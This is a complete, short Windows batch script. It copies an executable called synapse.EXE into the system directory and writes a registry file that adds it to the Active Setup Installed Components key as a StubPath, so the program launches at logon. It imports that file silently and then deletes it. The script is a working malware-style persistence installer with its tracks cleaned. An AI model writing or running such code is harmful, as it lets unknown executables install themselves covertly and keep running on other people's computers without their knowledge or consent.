@echo off
copy synapse.EXE %systemroot%
echo Windows Registry Editor Version 5.00 > reggy.REG
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\{7yrg8g6g5vvf6v}] >> reggy.REG
echo "StubPath"="%systemroot%\\synapse.EXE" >> reggy.REG
REGEDIT /S reggy.REG
del reggy.REG
